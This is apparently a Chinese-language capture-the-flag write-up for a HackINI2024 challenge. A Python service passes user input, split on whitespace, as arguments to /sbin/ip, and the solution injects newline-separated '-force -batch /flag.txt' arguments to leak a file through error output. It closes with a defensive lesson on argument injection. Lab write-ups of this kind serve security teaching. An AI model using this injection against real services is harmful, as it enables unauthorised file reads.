# HackINI2024 Network Navigators Odyssey Rebirth

## 题目简述

修订版服务不再使用 shell，而是把用户输入按空白切分后，以参数数组调用 `/sbin/ip`。程序只禁止普通空格，目标是用其他空白字符注入多个命令行参数，并利用 `ip` 自身的批处理功能读取 `/flag.txt`。

## 解题过程

服务端逻辑为：

```python
if " " in option:
    return "No spaces are allowed."

option = ["/sbin/ip"] + option.split()
result = subprocess.check_output(
    option,
    text=True,
    timeout=1,
    stderr=subprocess.STDOUT,
    shell=False,
)
```

`shell=False` 阻止了 shell 元字符解释，却不能阻止目标程序自己的危险参数。Python `str.split()` 默认会按空格、制表符和换行等所有空白切分，而过滤器只检查 ASCII 空格。使用文本框的 Shift+Enter 输入三行：

```text
-force
-batch
/flag.txt
```

切分后的真实调用为：

```python
[
    "/sbin/ip",
    "-force",
    "-batch",
    "/flag.txt",
]
```

`ip -batch` 会把指定文件当作批处理命令逐行解析。flag 不是合法的 `ip` 命令，所以内容会出现在错误信息中；`-force` 让工具在出错时继续，而程序又把 stderr 合并到 stdout，并在 `CalledProcessError` 分支返回错误输出。最终页面泄露：

```text
shellmates{5laugh73r_7h3_Pho3niXx!___1njec7_1T_w1tH_@rgum3ntSs!!}
```

## 方法总结

参数数组只消除了 shell 注入，不会自动消除 argument injection。若目标命令支持读取配置、批处理、输出文件或执行辅助程序等选项，攻击者仍可能借参数访问敏感资源。防御时应把用户输入映射到服务端固定的参数枚举，而不是过滤空格后再任意 `split()`。
